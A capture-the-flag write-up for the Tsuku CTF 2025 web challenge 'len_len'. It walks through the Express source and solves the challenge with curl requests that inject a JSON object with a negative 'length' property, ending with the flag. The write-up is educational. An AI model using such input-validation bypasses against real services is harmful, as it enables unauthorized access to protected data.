---
name: len_len (2025)
event: Tsuku CTF 2025
category: Web
description: Writeup for len_len (Web) - Tsuku CTF (2025) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# len_len

[![](https://img.youtube.com/vi/qGd4d0zmhy8/0.jpg)](https://www.youtube.com/watch?v=qGd4d0zmhy8?t=8 "len_len (Tsuku CTF)")

## Description

> `"length".length` is 6?

## Solution

### Site functionality

The challenge description suggests we run a curl command.

{% code overflow="wrap" %}
```bash
curl http://challs.tsukuctf.org:28888

How to use -> curl -X POST -d 'array=[1,2,3,4]' http://challs.tsukuctf.org:28888
```
{% endcode %}

Now we have a new curl command to try.

{% code overflow="wrap" %}
```bash
curl -X POST -d 'array=[1,2,3,4]' http://challs.tsukuctf.org:28888

error: no flag for you. sanitized string is [1,2,3,4], length is 9
```
{% endcode %}

Wait, do we just make the numbers add up to 6?

{% code overflow="wrap" %}
```bash
curl -X POST -d 'array=[1,2,3,0]' http://challs.tsukuctf.org:28888

error: no flag for you. sanitized string is [1,2,3,0], length is 9
```
{% endcode %}

I guess not. Let's check the source code 🔎

### Source code

{% code overflow="wrap" %}
```js
const express = require("express");
const bodyParser = require("body-parser");
const process = require("node:process");

const app = express();
const HOST = process.env.HOST ?? "localhost";
const PORT = process.env.PORT ?? "28888";
const FLAG = process.env.FLAG ?? "TsukuCTF25{dummy_flag}";

app.use(bodyParser.urlencoded({ extended: true }));

function chall(str = "[1, 2, 3]") {
    const sanitized = str.replaceAll(" ", "");
    if (sanitized.length < 10) {
        return `error: no flag for you. sanitized string is ${sanitized}, length is ${sanitized.length.toString()}`;
    }
    const array = JSON.parse(sanitized);
    if (array.length < 0) {
        // hmm...??
        return FLAG;
    }
    return `error: no flag for you. array length is too long -> ${array.length}`;
}

app.get("/", (_, res) => {
    res.send(`How to use -> curl -X POST -d 'array=[1,2,3,4]' http://${HOST}:${PORT}\n`);
});

app.post("/", (req, res) => {
    const array = req.body.array;
    res.send(chall(array));
});

app.listen(PORT, () => {
    console.log(`Server is running on http://${HOST}:${PORT}`);
});
```
{% endcode %}

### Breaking it down

1. The spaces are removed from our array (string)
2. The resulting string length must be >= 10
3. The string is parsed into an array with `JSON.parse`
4. The resulting array length must be < 0

### Crafting a JSON object

We can easily get around the first check by increasing the array (string) length, but we fail the second test.

{% code overflow="wrap" %}
```bash
curl -X POST -d 'array=[1,2,3,4,5]' http://challs.tsukuctf.org:28888

error: no flag for you. array length is too long -> 5
```
{% endcode %}

The trick here is to enter a string that is 10+ characters, but that when parsed as JSON will return a length less than 0. Since `array` is a JSON object and the code checks the `length` property of that object, why don't we try injecting a `length` property ourselves?

{% code overflow="wrap" %}
```bash
curl -X POST -d 'array={"length": -420}' http://challs.tsukuctf.org:28888

TsukuCTF25{l4n_l1n_lun_l4n_l0n}
```
{% endcode %}

It works, we get the flag! 🚩

Flag: `TsukuCTF25{l4n_l1n_lun_l4n_l0n}`
